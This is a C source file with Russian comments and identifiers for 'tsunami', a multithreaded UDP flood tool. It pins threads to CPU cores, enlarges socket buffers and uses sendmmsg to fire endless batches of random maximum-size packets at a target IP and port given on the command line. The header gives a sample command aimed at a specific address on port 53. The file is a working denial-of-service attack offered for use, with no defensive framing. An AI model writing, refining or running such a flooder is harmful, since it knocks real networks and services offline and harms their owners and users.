// gcc -std=c23 -O3 -o tsunami tsunami.c -pthread
// Запускать от рута для лучших результатов (изменение буферов сокета)
// sudo ./tsunami 50.7.22.222 53 4

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <sched.h>

// --- КОНФИГУРАЦИЯ ЗВЕРЯ ---
#define РАЗМЕР_ПОЛЕЗНОЙ_НАГРУЗКИ 1472 // Максимальный размер для стандартного MTU
#define КОЛИЧЕСТВО_ПОТОКОВ 4         // Под твои ядра EPYC
#define РАЗМЕР_ПАКЕТНОЙ_ОТПРАВКИ 128 // Сколько пакетов в одном системном вызове. Вот где мощь.
#define РАЗМЕР_БУФЕРА_СОКЕТА (8 * 1024 * 1024) // 8 МБ. Забиваем канал до отказа.

// --- Структура для данных потока ---
struct Поток_Данные {
    int ид_потока;
    struct sockaddr_in цель_адрес;
};

// --- Основная функция потока-убийцы ---
void *поток_атаки(void *аргументы) {
    struct Поток_Данные *данные = (struct Поток_Данные *)аргументы;
    int сокет_дескриптор;
    char буфер_нагрузки[РАЗМЕР_ПОЛЕЗНОЙ_НАГРУЗКИ];

    // --- Привязка потока к конкретному ядру процессора ---
    // --- Убирает дрожание планировщика и выжимает максимум ---
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(данные->ид_потока % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        // Плевать на ошибки. Продолжаем.
    }

    // --- Создание сокета ---
    сокет_дескриптор = socket(AF_INET, SOCK_DGRAM, 0);
    if (сокет_дескриптор < 0) {
        pthread_exit(NULL);
    }
    
    // --- РАСШИРЯЕМ БУФЕР ОТПРАВКИ СОКЕТА. КРИТИЧЕСКИ ВАЖНО. ---
    int размер_буфера = РАЗМЕР_БУФЕРА_СОКЕТА;
    if (setsockopt(сокет_дескриптор, SOL_SOCKET, SO_SNDBUF, &размер_буфера, sizeof(размер_буфера)) < 0) {
        // Если не удалось поднять буфер от рута, система будет использовать максимум по умолчанию. Все равно работаем.
    }

    // --- Генерируем случайный мусор один раз ---
    for (int i = 0; i < РАЗМЕР_ПОЛЕЗНОЙ_НАГРУЗКИ; i++) {
        буфер_нагрузки[i] = rand() & 0xFF;
    }

    // --- Готовим структуры для sendmmsg ---
    struct mmsghdr сообщения[РАЗМЕР_ПАКЕТНОЙ_ОТПРАВКИ];
    struct iovec iovecs[РАЗМЕР_ПАКЕТНОЙ_ОТПРАВКИ];
    memset(сообщения, 0, sizeof(сообщения));
    for (int i = 0; i < РАЗМЕР_ПАКЕТНОЙ_ОТПРАВКИ; i++) {
        iovecs[i].iov_base = буфер_нагрузки;
        iovecs[i].iov_len = РАЗМЕР_ПОЛЕЗНОЙ_НАГРУЗКИ;
        сообщения[i].msg_hdr.msg_iov = &iovecs[i];
        сообщения[i].msg_hdr.msg_iovlen = 1;
        сообщения[i].msg_hdr.msg_name = &данные->цель_адрес;
        сообщения[i].msg_hdr.msg_namelen = sizeof(данные->цель_адрес);
    }

    // --- Бесконечный цикл ада ---
    while (1) {
        // --- Отправка пачки пакетов одним системным вызовом. sendmmsg() - это молот богов. ---
        sendmmsg(сокет_дескриптор, сообщения, РАЗМЕР_ПАКЕТНОЙ_ОТПРАВКИ, 0);
    }

    close(сокет_дескриптор);
    pthread_exit(NULL);
}

// --- Главная функция ---
int main(int argc, char *argv[]) {
    if (argc < 3) {
        fprintf(stderr, "Использование: %s <IP_ЦЕЛИ> <ПОРТ_ЦЕЛИ>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));

    struct sockaddr_in цель_адрес;
    memset(&цель_адрес, 0, sizeof(цель_адрес));
    цель_адрес.sin_family = AF_INET;
    цель_адрес.sin_port = htons(atoi(argv[2]));
    if (inet_pton(AF_INET, argv[1], &цель_адрес.sin_addr) <= 0) {
        fprintf(stderr, "Ошибка: Неверный IP адрес.\n");
        return 1;
    }

    pthread_t потоки[КОЛИЧЕСТВО_ПОТОКОВ];
    struct Поток_Данные данные_потоков[КОЛИЧЕСТВО_ПОТОКОВ];

    for (int i = 0; i < КОЛИЧЕСТВО_ПОТОКОВ; i++) {
        данные_потоков[i].ид_потока = i;
        memcpy(&данные_потоков[i].цель_адрес, &цель_адрес, sizeof(цель_адрес));
        if (pthread_create(&потоки[i], NULL, поток_атаки, (void *)&данные_потоков[i]) != 0) {
            // Не смогли создать поток? Слабак.
        }
    }

    for (int i = 0; i < КОЛИЧЕСТВО_ПОТОКОВ; i++) {
        pthread_join(потоки[i], NULL);
    }

    return 0; // Недостижимый код. Вечность - наш предел.
}
